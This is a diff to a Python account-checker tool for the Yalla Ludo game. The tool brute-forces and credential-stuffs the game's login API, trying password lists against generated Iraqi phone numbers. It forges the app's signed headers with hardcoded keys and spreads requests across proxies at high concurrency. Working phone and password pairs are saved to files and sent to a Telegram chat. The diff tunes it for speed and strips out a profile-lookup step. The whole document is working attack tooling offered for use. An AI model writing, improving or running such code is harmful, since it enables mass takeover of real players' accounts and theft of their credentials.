@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Yalla Ludo Checker v2 - Full Speed + Working Login + Telegram + Custom Passwords
+# Yalla Ludo Checker v2 - MAX SPEED + Full Theme
 # By @to_ls
 
 import base64
@@ -52,12 +52,11 @@ MIV = b"0102030405060708"
 HERA = "f580270da66e44438d5ed30fdb08ebba"
 SPRE = "2.0_2_"
 LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
-PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
 
-# ==================== تحسينات السرعة ====================
-TIMEOUT = 0.1 # من 15 إلى 5 ثواني
-CONCURRENCY = 500  # من 300 إلى 500
-MAX_TASKS = 1000  # من 2000 إلى 1000
+# ==================== أقصى سرعة ====================
+TIMEOUT = 2  # 2 ثواني فقط!
+CONCURRENCY = 800  # 800 طلب متزامن
+MAX_TASKS = 1500
 
 # ==================== متغيرات التليجرام ====================
 BOT_TOKEN = ""
@@ -309,7 +308,7 @@ def payload(mobile, password_md5, dev):
     }
     return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')
 
-# ==================== دالة تسجيل الدخول (محسنة) ====================
+# ==================== دالة تسجيل الدخول (أسرع) ====================
 async def login_account(session, mobile, password_md5, dev=None, proxy=None):
     if dev is None:
         dev = {
@@ -330,8 +329,11 @@ async def login_account(session, mobile, password_md5, dev=None, proxy=None):
     body = payload(mobile, password_md5, dev)
     headers, wire, hera, dev = buildrequest(body, dev)
     
-    # تجربة جميع السيرفرات مع مهلة قصيرة
-    for server in LOGIN_SERVERS:
+    # تجربة السيرفرات بترتيب عشوائي للسرعة
+    servers = LOGIN_SERVERS.copy()
+    random.shuffle(servers)
+    
+    for server in servers:
         try:
             url = server + LOGIN_PATH
             async with session.post(url, data=wire, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as resp:
@@ -350,102 +352,19 @@ async def login_account(session, mobile, password_md5, dev=None, proxy=None):
                     token = user_data.get("token", "")
                     user_id = str(user_data.get("id", user_data.get("showNumId", "")))
                     
-                    if token and user_id:
-                        profile = await fetch_profile(session, token, user_id, dev, proxy)
-                        return {
-                            "success": True,
-                            "data": user_data,
-                            "token": token,
-                            "user_id": user_id,
-                            "dev": dev,
-                            "profile": profile
-                        }
-                    else:
-                        return {"success": True, "data": user_data, "token": token, "user_id": user_id, "dev": dev, "profile": None}
+                    return {
+                        "success": True,
+                        "data": user_data,
+                        "token": token,
+                        "user_id": user_id,
+                        "dev": dev
+                    }
                 elif result:
                     return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
-        except asyncio.TimeoutError:
-            continue
         except:
             continue
     
     return {"success": False, "error": "All servers failed"}
-
-async def fetch_profile(session, token, user_id, dev, proxy=None):
-    if not token or not user_id:
-        return None
-    
-    # تجربة جميع السيرفرات مع مهلة قصيرة
-    for server in LOGIN_SERVERS:
-        try:
-            now = int(time.time() * 1000)
-            nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
-            bag_sign = hashlib.md5(("c889f8f7dc69b1d67e1d3e43cf48f430" + nc).encode()).hexdigest().upper()
-            
-            bag = {
-                "token": token,
-                "sign": bag_sign,
-                "timeSpan": str(now),
-                "version": "1.4.9.2",
-                "deviceId": dev["deviceId"],
-                "deviceName": dev["deviceName"],
-                "deviceType": dev["deviceType"],
-                "downloadChannelId": dev["downloadChannelId"],
-                "shuMengId": dev["shuMengId"],
-                "nonce": nc,
-                "plateType": dev["plateType"],
-                "LanguageId": dev["LanguageId"],
-                "phoneModel": dev["phoneModel"],
-                "X-Phone-Country": dev["X-Phone-Country"],
-                "X-Sim-Country": dev["X-Sim-Country"],
-                "AndroidId": dev["AndroidId"],
-                "appType": dev["appType"],
-            }
-            bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-            
-            sg = PROFILE_PATH + token + "1.4.9.2" + bb
-            sig = hmac.new("c889f8f7dc69b1d67e1d3e43cf48f430".encode(), sg.encode(), hashlib.sha256).hexdigest()
-            xs = "2.0_2_" + sig
-            
-            p = hashlib.md5(sg.encode()).hexdigest()
-            mp = f"{p}-{len(sg)}-c889f8f7dc69b1d67e1d3e43cf48f430-L3)qk*@8".encode()
-            xm = base64.b64encode(_aes_cbc(b"4e82797b276c5cb729db62aaa229a057", b"0102030405060708", mp)).decode()
-            
-            pm = _xor_b64(json.dumps({"userId": int(user_id)}, separators=(",", ":")), "c889f8f7dc69b1d67e1d3e43cf48f430")
-            
-            headers = {
-                "User-Agent": "YallaLudo-1.4.9.2-(Build 1040922)-Android 30",
-                "UserId": str(user_id),
-                "X-App-Id": "ludo",
-                "X-Baggage": bb,
-                "X-Access-Token": token,
-                "X-Timestamp": str(now + random.randint(50, 300)),
-                "versionString": "1.4.9.2",
-                "X-Sign": xs,
-                "X-Hera": "f580270da66e44438d5ed30fdb08ebba",
-                "X-Time": str(now + random.randint(50, 300)),
-                "X-Medusa": xm,
-                "Content-Type": "application/json; charset=utf-8",
-                "Accept-Encoding": "gzip",
-            }
-            
-            url = server + PROFILE_PATH
-            async with session.post(url, json={"paramJsonString": pm}, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-                if r.status in (403, 500, 404):
-                    continue
-                obj = await r.json()
-                if obj.get("status") == 0:
-                    data = obj.get("data") or {}
-                    base = data.get("baseInfo") or data
-                    if base.get("goldNum") is not None or base.get("diamondNum") is not None:
-                        return data
-                    else:
-                        return data
-        except asyncio.TimeoutError:
-            continue
-        except:
-            continue
-    return None
 
 # ==================== دالة إرسال التليجرام ====================
 async def send_telegram(session, account):
@@ -454,7 +373,6 @@ async def send_telegram(session, account):
     if not TELEGRAM_ENABLED or not BOT_TOKEN or not CHAT_IDS:
         return False
     
-    vip_status = "✅ VIP" if account.get('is_vip', False) else "❌ Non-VIP"
     message = f"""🎯 Yalla Ludo HIT!
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -462,12 +380,6 @@ async def send_telegram(session, account):
 🔑 Pass: <code>{account['password']}</code>
 👤 Name: <b>{account.get('name', 'Unknown')}</b>
 🆔 ID: <code>{account.get('uid', '')}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💰 Gold: <b>{account.get('gold', 0):,}</b>
-💎 Diamond: <b>{account.get('diamond', 0):,}</b>
-📊 Level: <b>{account.get('level', 0)}</b>
-⭐ XP: <b>{account.get('exp', 0):,} / {account.get('max_exp', 0):,}</b>
-👑 VIP: <b>{vip_status}</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 By @to_ls"""
@@ -477,7 +389,7 @@ By @to_ls"""
     
     for chat_id in CHAT_IDS:
         sent = False
-        for attempt in range(3):
+        for attempt in range(2):
             try:
                 payload = {
                     'chat_id': chat_id,
@@ -485,7 +397,7 @@ By @to_ls"""
                     'parse_mode': 'HTML',
                     'disable_web_page_preview': True
                 }
-                async with session.post(url, data=payload, timeout=30) as resp:
+                async with session.post(url, data=payload, timeout=10) as resp:
                     if resp.status == 200:
                         if RICH_AVAILABLE:
                             console.print(f"[green][✓][/green] Sent to {chat_id}: {account['phone']}")
@@ -493,10 +405,8 @@ By @to_ls"""
                             print(f"[✓] Sent to {chat_id}: {account['phone']}")
                         sent = True
                         break
-                    else:
-                        await asyncio.sleep(1)
             except:
-                await asyncio.sleep(1)
+                pass
         
         if not sent:
             if RICH_AVAILABLE:
@@ -509,23 +419,9 @@ By @to_ls"""
 
 # ==================== حفظ النتائج ====================
 def save_account_by_gold(account):
-    gold = account.get('gold', 0)
     phone = account['phone']
     password = account['password']
-    
-    if gold < 1000000:
-        filename = "gold_0_1M.txt"
-    elif gold < 5000000:
-        filename = "gold_1M_5M.txt"
-    elif gold < 10000000:
-        filename = "gold_5M_10M.txt"
-    elif gold < 50000000:
-        filename = "gold_10M_50M.txt"
-    elif gold < 100000000:
-        filename = "gold_50M_100M.txt"
-    else:
-        filename = "gold_100M_plus.txt"
-    
+    filename = "good_accounts.txt"
     try:
         with open(filename, 'a', encoding='utf-8') as f:
             f.write(f"{phone}:{password}\n")
@@ -533,22 +429,11 @@ def save_account_by_gold(account):
     except:
         return None
 
-def save_account_full_by_gold(account):
-    filename = "good_accounts_full.txt"
-    try:
-        with open(filename, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
-        return True
-    except:
-        return False
-
 def save_single_result(account):
     filename = "single_check_results.txt"
     try:
         with open(filename, 'a', encoding='utf-8') as f:
-            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
-            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
+            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')}\n")
         return True
     except:
         return False
@@ -644,7 +529,6 @@ proxy_manager = None
 
 # ==================== دالة الحصول على الباسوردات ====================
 def get_passwords_list():
-    """الحصول على قائمة الباسوردات من المستخدم"""
     print("\n[+] Password Options:")
     print("  [1] Use default passwords (القائمة الافتراضية)")
     print("  [2] Enter custom passwords (إدخال باسوردات مخصصة)")
@@ -654,7 +538,6 @@ def get_passwords_list():
     
     if choice == "1":
         return DEFAULT_PASSWORDS.copy()
-    
     elif choice == "2":
         print("\n[+] Enter passwords (one per line, empty line to finish):")
         passwords = []
@@ -668,7 +551,6 @@ def get_passwords_list():
             print("[!] No passwords entered, using default list")
             return DEFAULT_PASSWORDS.copy()
         return passwords
-    
     elif choice == "3":
         print("\n[+] Enter additional passwords (one per line, empty line to finish):")
         custom_passwords = []
@@ -678,12 +560,10 @@ def get_passwords_list():
                 break
             if pwd:
                 custom_passwords.append(pwd)
-        
         all_passwords = DEFAULT_PASSWORDS.copy()
         if custom_passwords:
             all_passwords.extend(custom_passwords)
         return all_passwords
-    
     else:
         print("[!] Invalid choice, using default passwords")
         return DEFAULT_PASSWORDS.copy()
@@ -710,44 +590,11 @@ async def check_single_account(session, phone, password):
                 save_single_result(account)
                 return account
             
-            gold = 0
-            diamond = 0
-            level = 0
-            exp = 0
-            max_exp = 0
-            royal = 0
-            is_vip = False
-            vip_type = ""
-            
-            profile = result.get("profile")
-            if profile:
-                base = profile.get("baseInfo", profile)
-                gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
-                diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
-                level = int(base.get("levelId", base.get("level", 0)) or 0)
-                exp = int(base.get("experience", 0) or 0)
-                max_exp = int(base.get("maxExp", 100) or 100)
-                royal = int(base.get("royalLevel", 0) or 0)
-                is_vip = base.get("isVip", False)
-                vip_info = profile.get("vipInfo", {})
-                if vip_info:
-                    vip_type = vip_info.get("vipType", "")
-                    if not vip_type and is_vip:
-                        vip_type = "VIP"
-            
             account_data = {
                 'phone': phone,
                 'password': password,
                 'name': name,
                 'uid': uid,
-                'gold': gold,
-                'diamond': diamond,
-                'level': level,
-                'exp': exp,
-                'max_exp': max_exp,
-                'royal': royal,
-                'is_vip': is_vip,
-                'vip_type': vip_type,
                 'status': 'success'
             }
             
@@ -758,11 +605,6 @@ async def check_single_account(session, phone, password):
 🔑 Password: {password}
 👤 Name: {name}
 🆔 ID: {uid}
-💰 Gold: {gold:,}
-💎 Diamond: {diamond:,}
-📊 Level: {level}
-⭐ XP: {exp:,} / {max_exp:,}
-👑 VIP: {'✅ Yes' if is_vip else '❌ No'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """)
             
@@ -839,128 +681,29 @@ async def check_random_async(session, mobile, semaphore, passwords_list, proxy=N
                             print(f"    Name: EMPTY - Account needs verification")
                         return
                     
-                    gold = 0
-                    diamond = 0
-                    level = 0
-                    exp = 0
-                    max_exp = 0
-                    royal = 0
-                    is_vip = False
-                    vip_type = ""
-                    
-                    profile = result.get("profile")
-                    if profile:
-                        base = profile.get("baseInfo", profile)
-                        gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
-                        diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
-                        level = int(base.get("levelId", base.get("level", 0)) or 0)
-                        exp = int(base.get("experience", 0) or 0)
-                        max_exp = int(base.get("maxExp", 100) or 100)
-                        royal = int(base.get("royalLevel", 0) or 0)
-                        is_vip = base.get("isVip", False)
-                        vip_info = profile.get("vipInfo", {})
-                        if vip_info:
-                            vip_type = vip_info.get("vipType", "")
-                            if not vip_type and is_vip:
-                                vip_type = "VIP"
-                    
                     account_data = {
                         'phone': mobile,
                         'password': pwd,
                         'name': name,
-                        'uid': uid,
-                        'gold': gold,
-                        'diamond': diamond,
-                        'level': level,
-                        'exp': exp,
-                        'max_exp': max_exp,
-                        'royal': royal,
-                        'is_vip': is_vip,
-                        'vip_type': vip_type
+                        'uid': uid
                     }
                     
                     with stats_lock:
                         stats['good'] += 1
                         stats['total'] += 1
-                        
-                        if gold < 1000000:
-                            gold_stats["0-999K"] += 1
-                        elif gold < 5000000:
-                            gold_stats["1M-4.9M"] += 1
-                        elif gold < 10000000:
-                            gold_stats["5M-9.9M"] += 1
-                        elif gold < 50000000:
-                            gold_stats["10M-49M"] += 1
-                        elif gold < 100000000:
-                            gold_stats["50M-99M"] += 1
-                        else:
-                            gold_stats["100M+"] += 1
-                        
-                        if diamond < 10000:
-                            diamond_stats["0-9.9K"] += 1
-                        elif diamond < 50000:
-                            diamond_stats["10K-49K"] += 1
-                        elif diamond < 100000:
-                            diamond_stats["50K-99K"] += 1
-                        elif diamond < 500000:
-                            diamond_stats["100K-499K"] += 1
-                        elif diamond < 1000000:
-                            diamond_stats["500K-999K"] += 1
-                        else:
-                            diamond_stats["1M+"] += 1
-                        
-                        if level < 10:
-                            level_stats["Level 0-9"] += 1
-                        elif level < 20:
-                            level_stats["Level 10-19"] += 1
-                        elif level < 30:
-                            level_stats["Level 20-29"] += 1
-                        elif level < 40:
-                            level_stats["Level 30-39"] += 1
-                        else:
-                            level_stats["Level 40+"] += 1
-                        
-                        if is_vip:
-                            vip_stats["VIP"] += 1
-                            if vip_type:
-                                vip_stats[f"VIP_{vip_type}"] += 1
-                        else:
-                            vip_stats["Non-VIP"] += 1
-                        
                         found_accounts.append(account_data)
                     
                     saved_file = save_account_by_gold(account_data)
-                    save_account_full_by_gold(account_data)
                     
                     if RICH_AVAILABLE:
                         console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
                         console.print(f"    Name: {name}")
                         console.print(f"    ID: {uid}")
-                        console.print(f"    Gold: [green]{gold:,}[/green]")
-                        console.print(f"    Diamond: [green]{diamond:,}[/green]")
-                        console.print(f"    Level: [green]{level}[/green]")
-                        if is_vip:
-                            vip_text = f"✅ Yes"
-                            if vip_type:
-                                vip_text += f" ({vip_type})"
-                            console.print(f"    VIP: [green]{vip_text}[/green]")
-                        else:
-                            console.print(f"    VIP: [red]No[/red]")
                         console.print(f"    [dim]Saved to {saved_file}[/dim]")
                     else:
                         print(f"\n[+] GOOD: {mobile} | {pwd}")
                         print(f"    Name: {name}")
                         print(f"    ID: {uid}")
-                        print(f"    Gold: {gold:,}")
-                        print(f"    Diamond: {diamond:,}")
-                        print(f"    Level: {level}")
-                        if is_vip:
-                            vip_text = f"Yes"
-                            if vip_type:
-                                vip_text += f" ({vip_type})"
-                            print(f"    VIP: {vip_text}")
-                        else:
-                            print(f"    VIP: No")
                         print(f"    Saved to {saved_file}")
                     
                     if TELEGRAM_ENABLED:
@@ -980,23 +723,17 @@ async def check_random_async(session, mobile, semaphore, passwords_list, proxy=N
                             stats['total'] += 1
                         return
                         
-            except asyncio.TimeoutError:
-                with stats_lock:
-                    stats['error'] += 1
-                    stats['total'] += 1
-                continue
             except Exception as e:
                 with stats_lock:
                     stats['error'] += 1
                     stats['total'] += 1
-                if proxy:
-                    continue
+                continue
         
         with stats_lock:
             stats['wrong_pass'] += 1
             stats['total'] += 1
 
-# ==================== داشبورد ====================
+# ==================== داشبورد كامل ====================
 def create_dashboard():
     elapsed = int(time.time() - start_time)
     hours = elapsed // 3600
@@ -1058,14 +795,13 @@ def create_dashboard():
         
         last_found_text = ""
         for acc in found_accounts[-5:]:
-            vip_status = "✅VIP" if acc['is_vip'] else "❌"
-            last_found_text += f"  [green]{acc['phone']}[/green] | Pass: [yellow]{acc['password']}[/yellow] | Gold:[green]{acc['gold']:,}[/green] | Diamond:[green]{acc['diamond']:,}[/green] | Lv:[green]{acc['level']}[/green] | VIP:{vip_status}\n"
+            last_found_text += f"  [green]{acc['phone']}[/green] | Pass: [yellow]{acc['password']}[/yellow] | Name: [cyan]{acc.get('name', 'Unknown')}[/cyan]\n"
         if not last_found_text:
             last_found_text = "  No accounts found yet..."
         
         layout = Layout()
         layout.split_column(
-            Layout(Panel(Text("YALLA LUDO CHECKER v2 - Iraq Only", style="bold bright_blue"), box=box.HEAVY)),
+            Layout(Panel(Text("YALLA LUDO CHECKER v2 - MAX SPEED", style="bold bright_blue"), box=box.HEAVY)),
             Layout(Panel(stats_table, title="[bold]Statistics", border_style="blue")),
             Layout(name="middle"),
             Layout(Panel(last_found_text, title="[bold green]Last Found Accounts", border_style="green")),
@@ -1082,7 +818,7 @@ def create_dashboard():
     else:
         output = f"""
 ╔══════════════════════════════════════════════════════════════╗
-║              YALLA LUDO CHECKER v2                         ║
+║         YALLA LUDO CHECKER v2 - MAX SPEED                  ║
 ║              Iraq Only - 77xxxxxxxx                        ║
 ║              By @to_ls                                     ║
 ╚══════════════════════════════════════════════════════════════╝
@@ -1125,8 +861,7 @@ def create_dashboard():
   ── LAST FOUND ACCOUNTS ──
 """
         for acc in found_accounts[-5:]:
-            vip_status = "VIP" if acc['is_vip'] else "Non-VIP"
-            output += f"    {acc['phone']} | Pass: {acc['password']} | Gold:{acc['gold']} | Diamond:{acc['diamond']} | Lv:{acc['level']} | {vip_status}\n"
+            output += f"    {acc['phone']} | Pass: {acc['password']} | Name: {acc.get('name', 'Unknown')}\n"
         if not found_accounts:
             output += "    No accounts found yet...\n"
         
@@ -1137,27 +872,27 @@ def create_dashboard():
 
 def dashboard_loop():
     if RICH_AVAILABLE:
-        with Live(create_dashboard(), refresh_per_second=1, screen=True) as live:
+        with Live(create_dashboard(), refresh_per_second=2, screen=True) as live:
             while not stop_flag:
                 live.update(create_dashboard())
-                time.sleep(1)
+                time.sleep(0.5)
     else:
         while not stop_flag:
             os.system('cls' if os.name == 'nt' else 'clear')
             print(create_dashboard())
-            time.sleep(1)
+            time.sleep(0.5)
 
 # ==================== MAIN ====================
 async def main_async():
     global stop_flag, proxy_manager, BOT_TOKEN, CHAT_IDS, TELEGRAM_ENABLED
     
     if RICH_AVAILABLE:
-        console.print(Panel("Yalla Ludo Checker v2\nSingle Account & Random Mode + Telegram + Custom Passwords\nBy @to_ls", style="bold blue", box=box.HEAVY))
+        console.print(Panel("Yalla Ludo Checker v2 - MAX SPEED\nSingle & Random Mode + Full Theme\nBy @to_ls", style="bold blue", box=box.HEAVY))
     else:
         print("""
 ╔══════════════════════════════════════════════════════════════╗
-║              YALLA LUDO CHECKER v2                         ║
-║    Single Account & Random Mode + Telegram + Custom Pass   ║
+║         YALLA LUDO CHECKER v2 - MAX SPEED                  ║
+║         Single & Random Mode + Full Theme                  ║
 ║              By @to_ls                                     ║
 ╚══════════════════════════════════════════════════════════════╝
         """)
@@ -1222,7 +957,6 @@ async def main_async():
             else:
                 print("[!] Running without proxies")
         
-        # ==================== اختيار الباسوردات ====================
         passwords_list = get_passwords_list()
         
         if RICH_AVAILABLE:
@@ -1238,7 +972,12 @@ async def main_async():
         
         threading.Thread(target=dashboard_loop, daemon=True).start()
         
-        connector = aiohttp.TCPConnector(limit=CONCURRENCY*2, limit_per_host=CONCURRENCY, force_close=False)
+        connector = aiohttp.TCPConnector(
+            limit=CONCURRENCY*2,
+            limit_per_host=CONCURRENCY,
+            force_close=False,
+            enable_cleanup_closed=True
+        )
         
         async with aiohttp.ClientSession(connector=connector) as session:
             tasks = []
